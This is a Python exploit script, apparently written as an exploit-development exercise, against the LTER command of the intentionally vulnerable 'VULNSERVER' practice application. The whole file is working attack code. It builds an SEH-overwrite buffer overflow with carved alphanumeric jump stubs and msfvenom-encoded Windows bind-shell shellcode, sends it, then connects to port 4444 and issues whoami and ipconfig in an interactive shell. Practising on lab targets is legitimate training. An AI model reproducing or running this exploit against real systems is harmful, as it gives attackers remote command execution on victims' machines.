#!/usr/bin/python
import socket
import os
import sys

from pwn import *

if len (sys.argv) != 2 :
    print 'Usage:  python %s <tartget>' % sys.argv[0]
    sys.exit(1)

host= sys.argv[1]
port=9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print "[+] Connected to VULNSERVER"

except:
    print "socket() failed"
    sys.exit(1)


jmp_to_buff_start = (
        "\x54"                   # PUSH ESP
        "\x58"                   # POP EAX
        "\x2D\x67\x55\x55\x55"   # SUB EAX,55555567
        "\x2D\x67\x55\x55\x55"   # SUB EAX,55555567
        "\x2D\x69\x55\x55\x55"   # SUB EAX,55555569
        "\x50"                   # PUSH EAX
        "\x5F"                   # POP EDI
        "\x2D\x3D\x59\x55\x55"   # SUB EAX,5555593D
        "\x2D\x3D\x59\x55\x55"   # SUB EAX,5555593D
        "\x2D\x3F\x5B\x55\x55"   # SUB EAX,55555B3F
        "\x50"                   # PUSH EAX
        "\x5B"                   # POP EBX
        "\x25\x4A\x4D\x4E\x55"   # AND EAX,554E4D4A
        "\x25\x35\x32\x31\x2A"   # AND EAX,2A313235
        "\x2D\x38\x36\x55\x5E"   # SUB EAX,5E553638
        "\x2D\x38\x36\x55\x5E"   # SUB EAX,5E553638
        "\x2D\x3A\x37\x56\x5F"   # SUB EAX,5F56373A
        "\x57"                   # PUSH EDI
        "\x5C"                   # POP ESP
        "\x50"                   # PUSH EAX
        )

shellcode = "\x43" * 16
# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed  EXITFUNC=thread BufferRegister=EBX -f c
shellcode +=(
        "\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
        "\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
        "\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
        "\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x49\x78\x6b\x32\x63\x30"
        "\x73\x30\x55\x50\x53\x50\x4d\x59\x68\x65\x45\x61\x69\x50\x31"
        "\x74\x4c\x4b\x32\x70\x56\x50\x4c\x4b\x30\x52\x34\x4c\x6e\x6b"
        "\x76\x32\x62\x34\x4e\x6b\x50\x72\x57\x58\x74\x4f\x48\x37\x61"
        "\x5a\x77\x56\x35\x61\x69\x6f\x6e\x4c\x35\x6c\x75\x31\x63\x4c"
        "\x33\x32\x34\x6c\x37\x50\x7a\x61\x4a\x6f\x66\x6d\x73\x31\x6a"
        "\x67\x6a\x42\x6a\x52\x63\x62\x53\x67\x4c\x4b\x73\x62\x52\x30"
        "\x6e\x6b\x51\x5a\x75\x6c\x4e\x6b\x72\x6c\x72\x31\x34\x38\x39"
        "\x73\x50\x48\x33\x31\x6b\x61\x52\x71\x6c\x4b\x43\x69\x31\x30"
        "\x73\x31\x58\x53\x6c\x4b\x53\x79\x76\x78\x69\x73\x65\x6a\x32"
        "\x69\x4e\x6b\x55\x64\x6e\x6b\x55\x51\x6b\x66\x44\x71\x79\x6f"
        "\x6c\x6c\x5a\x61\x5a\x6f\x64\x4d\x63\x31\x4f\x37\x70\x38\x4d"
        "\x30\x70\x75\x6a\x56\x57\x73\x73\x4d\x4b\x48\x35\x6b\x61\x6d"
        "\x75\x74\x61\x65\x5a\x44\x70\x58\x6c\x4b\x61\x48\x67\x54\x67"
        "\x71\x4b\x63\x42\x46\x4c\x4b\x66\x6c\x52\x6b\x6e\x6b\x62\x78"
        "\x35\x4c\x65\x51\x38\x53\x6e\x6b\x76\x64\x6c\x4b\x65\x51\x68"
        "\x50\x6e\x69\x61\x54\x45\x74\x76\x44\x73\x6b\x51\x4b\x45\x31"
        "\x73\x69\x72\x7a\x63\x61\x69\x6f\x39\x70\x63\x6f\x71\x4f\x50"
        "\x5a\x6c\x4b\x76\x72\x5a\x4b\x6e\x6d\x53\x6d\x65\x38\x47\x43"
        "\x76\x52\x73\x30\x35\x50\x52\x48\x50\x77\x70\x73\x47\x42\x71"
        "\x4f\x72\x74\x31\x78\x30\x4c\x30\x77\x55\x76\x54\x47\x6b\x4f"
        "\x58\x55\x4f\x48\x6e\x70\x53\x31\x65\x50\x37\x70\x46\x49\x58"
        "\x44\x76\x34\x66\x30\x30\x68\x47\x59\x6b\x30\x32\x4b\x47\x70"
        "\x39\x6f\x59\x45\x50\x6a\x66\x68\x32\x79\x52\x70\x49\x72\x69"
        "\x6d\x77\x30\x62\x70\x33\x70\x36\x30\x63\x58\x4a\x4a\x34\x4f"
        "\x49\x4f\x6b\x50\x6b\x4f\x79\x45\x4d\x47\x70\x68\x63\x32\x53"
        "\x30\x56\x71\x53\x6c\x6f\x79\x49\x76\x63\x5a\x32\x30\x66\x36"
        "\x43\x67\x51\x78\x59\x52\x49\x4b\x75\x67\x70\x67\x79\x6f\x49"
        "\x45\x52\x77\x62\x48\x68\x37\x4b\x59\x64\x78\x59\x6f\x69\x6f"
        "\x58\x55\x63\x67\x42\x48\x32\x54\x6a\x4c\x45\x6b\x79\x71\x39"
        "\x6f\x4a\x75\x56\x37\x6a\x37\x30\x68\x62\x55\x52\x4e\x52\x6d"
        "\x51\x71\x79\x6f\x58\x55\x50\x68\x43\x53\x32\x4d\x55\x34\x65"
        "\x50\x6d\x59\x68\x63\x33\x67\x31\x47\x56\x37\x46\x51\x4a\x56"
        "\x30\x6a\x66\x72\x52\x79\x33\x66\x59\x72\x4b\x4d\x71\x76\x4f"
        "\x37\x33\x74\x54\x64\x57\x4c\x36\x61\x57\x71\x6e\x6d\x47\x34"
        "\x35\x74\x56\x70\x6f\x36\x75\x50\x71\x54\x42\x74\x72\x70\x42"
        "\x76\x71\x46\x36\x36\x31\x56\x43\x66\x50\x4e\x61\x46\x53\x66"
        "\x30\x53\x53\x66\x31\x78\x70\x79\x38\x4c\x37\x4f\x6e\x66\x6b"
        "\x4f\x48\x55\x6d\x59\x59\x70\x62\x6e\x73\x66\x62\x66\x6b\x4f"
        "\x36\x50\x43\x58\x63\x38\x4d\x57\x67\x6d\x73\x50\x49\x6f\x69"
        "\x45\x6d\x6b\x49\x70\x45\x4d\x55\x7a\x57\x7a\x65\x38\x4f\x56"
        "\x4d\x45\x4f\x4d\x6d\x4d\x6b\x4f\x78\x55\x67\x4c\x67\x76\x43"
        "\x4c\x57\x7a\x4b\x30\x39\x6b\x79\x70\x43\x45\x44\x45\x6f\x4b"
        "\x70\x47\x47\x63\x42\x52\x42\x4f\x70\x6a\x43\x30\x52\x73\x79"
        "\x6f\x4a\x75\x41\x41"
        )
con_jmp = "\x71\x06\x70\x04"
A   = (
        "\x41" * 4 +
        shellcode + 
        "\x41" * (3444 - len(shellcode)) +
        jmp_to_buff_start +
        "\x42" * (3518 - 3448 - len(jmp_to_buff_start)) +
        con_jmp
    )

# SEH chain of thread 00002228
# Address    SE handler
# 0173FFC4   45346E45
# 6250120B   59  POP ECX
SEH = p32(0x6250120B)

# The start of the long jump back
# Will be using a carve out method
long_jmp = (
        "\x58"                      # POP EAX
        "\x58"                      # POP EAX
        "\x58"                      # POP EAX
        "\x2D\x42\x55\x55\x55"      # SUB EAX,55555542
        "\x2D\x42\x55\x55\x55"      # SUB EAX,55555542
        "\x2D\x42\x55\x55\x55"      # SUB EAX,55555542
        "\x54"                      # PUSH ESP
        "\x5E"                      # POP ESI
        "\x50"                      # PUSH EAX
        "\x5C"                      # POP ESP
        "\x25\x4A\x4D\x4E\x55"      # AND EAX,554E4D4A
        "\x25\x35\x32\x31\x2A"      # AND EAX,2A313235
        "\x2D\x7A\x7A\x5C\x2A"      # SUB EAX,2A5C7A7A
        "\x2D\x7A\x7A\x5C\x2A"      # SUB EAX,2A5C7A7A
        "\x2D\x7C\x7A\x5B\x2A"      # SUB EAX,2A5B7A7C
        "\x50"                      # PUSH EAX
        "\x90"                      # NOP
        "\x90"                      # NOP
        "\xEB\x80"                  # JMP SHORT 017CFF7F
        )

C   = long_jmp + "\x43" * (6000 - len(long_jmp) - len(A) - len(SEH))

buffer = "LTER ." + A + SEH + C
print "[+] Sending exploit buffer"
s.send(buffer)

print "[+] Waiting for shell."
time.sleep(2)
bind_port = 4444

r = remote(host, bind_port)
r.send("whoami\n")
r.send("ipconfig\n")
r.interactive()
